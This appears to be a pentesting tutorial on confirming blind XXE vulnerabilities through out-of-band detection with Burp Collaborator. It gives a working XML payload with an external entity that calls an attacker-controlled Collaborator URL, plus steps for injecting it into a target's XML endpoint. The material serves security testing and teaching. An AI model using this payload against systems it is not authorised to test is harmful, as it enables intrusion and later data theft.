# Basic Blind XXE

## Context

The primary objective of this article is to demonstrate how to exploit blind XXE (XML External Entity) vulnerabilities. Such vulnerabilities allow an attacker to confirm external entity resolution and test out-of-band connectivity without receiving direct feedback from the application. The reader should be familiar with XML structure, entity declaration, out-of-band communication, and XML external entity concepts.

## Theory

### Nature of Blind XXE Vulnerabilities

Blind XXE vulnerabilities occur when an application processes XML external entities but does not return direct output to the attacker. This lack of feedback necessitates using out-of-band communication channels to confirm whether the exploitation was successful. Therefore, the attacker must carefully craft XML payloads and monitor interactive services to detect external requests.

### Out-of-Band Detection Techniques for Blind XXE

When exploiting blind XXE, the attacker injects a payload that references an external entity linked to an attacker-controlled server. This setup allows the attacker to monitor any interactions, such as HTTP or DNS requests, that occur as a result of the exploitation. The data flow typically involves the following steps: the vulnerable application parses the injected XML data, triggers the resolution of the external entity, and sends an outbound request to the attacker's server for further interaction.

### Role of Burp Collaborator and Similar Services

Burp Collaborator is a tool that provides unique identifiers in the form of URLs to help detect and log out-of-band interactions from potentially vulnerable servers. It is a core component of the Burp Suite and is instrumental in confirming XXE vulnerability even when the server or application provides no visible output to the user. Collaborator captures DNS, HTTP, or HTTPS interactions, providing evidence of successful XML entity resolution.

## Practice

### Blind XXE with Out-of-Band Interaction (Burp Collaborator)

- **Obtain a Unique Burp Collaborator URL:**
  Start by obtaining a unique URL from Burp Collaborator. This URL will be crucial for monitoring any out-of-band requests made by target servers during the XXE attack.

- **Craft the XXE Payload:**
  Inject the following XML payload into the target application, replacing `<collaborator-url>` with the actual URL provided by Burp Collaborator:
  
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<collaborator-url>/"> ]>
  <foo>&xxe;</foo>
  ```

- **Submit the Payload:**
  Use the target application's interface or an intercepting proxy tool like Burp Suite to submit the crafted XML payload to the applicationâ€™s XML input endpoint.

- **Monitor for Requests:**
  After submitting your payload, monitor the Burp Collaborator interface for any DNS or HTTP requests that originated from the target server. These interactions confirm that the server processed the external entity, providing proof of the vulnerability.

#### Outcome

Successfully capturing outbound server interactions in Burp Collaborator during this process confirms the presence of a blind XXE vulnerability. This validation is key for understanding the attack surface and further exploiting the vulnerability if applicable.
